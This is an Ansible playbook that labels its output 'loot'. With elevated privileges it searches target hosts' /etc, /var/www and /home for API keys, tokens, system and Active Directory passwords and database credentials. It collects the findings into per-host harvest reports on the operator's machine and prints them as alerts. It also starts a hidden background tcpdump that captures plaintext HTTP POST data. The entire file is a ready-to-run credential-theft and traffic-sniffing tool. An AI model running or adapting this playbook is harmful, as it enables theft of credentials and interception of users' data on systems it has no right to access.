---
# 1. API KEYS (Looking for cloud/service tokens)
- name: Extract API Keys
  become: yes
  shell: |
    grep -rEo "(api_key|token|secret|access_key)\s*[:=]\s*['\"]?[^'\" \t\n;]{8,64}['\"]?" /etc /var/www 2>/dev/null \
    | grep -vE "(wp-includes|wp-admin|node_modules|undefined|update|unmount)" \
    | sort -u
  register: api_results
  failed_when: false

# 2. SYSTEM & AD CREDENTIALS (Looking for local users/AD configs)
- name: Extract System and AD Credentials
  become: yes
  shell: |
    grep -rEo "(passwd|password|bind_dn|bind_pw)\s*[:=]\s*['\"]?[^'\" \t\n;]{4,32}['\"]?" /etc /home 2>/dev/null \
    | grep -vE "(\.js|\.css|undefined|passwd: files|passwd: False)" \
    | sort -u
  register: ad_results
  failed_when: false

# 3. DATABASE CREDENTIALS (Specifically targeting config files)
- name: Extract Database Credentials
  become: yes
  shell: |
    grep -rEo "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null \
    | grep -v "wp-config-sample.php" \
    | sed "s/['\"],/ = /g" | tr -d "()',\"" | sort -u
  register: db_results
  failed_when: false

# 4. DELIVERY (Organized sections)
- name: Deliver Organized Loot
  delegate_to: localhost
  copy:
    content: |
      === HARVEST REPORT: {{ inventory_hostname }} ===

      [SECTION 1: API KEYS & TOKENS]
      {{ api_results.stdout if api_results.stdout != "" else "None found" }}

      [SECTION 2: AD & SYSTEM CREDENTIALS]
      {{ ad_results.stdout if ad_results.stdout != "" else "None found" }}

      [SECTION 3: DATABASE CREDENTIALS]
      {{ db_results.stdout if db_results.stdout != "" else "None found" }}
    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/organized_loot.txt"
  become: no

# 5. LIVE ALERT (Categorized for the terminal)
- name: "CATEGORIZED LOOT ALERT: {{ inventory_hostname }}"
  debug:
    msg:
      - "--- API KEYS ---"
      - "{{ api_results.stdout_lines | default(['None']) }}"
      - "--- AD/SYSTEM ---"
      - "{{ ad_results.stdout_lines | default(['None']) }}"
      - "--- DATABASE ---"
      - "{{ db_results.stdout_lines | default(['None']) }}"
  when: api_results.stdout != "" or ad_results.stdout != "" or db_results.stdout != ""

- name: Start Background Network Sniffer
  delegate_to: localhost
  shell: |
    nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
  run_once: true
  become: yes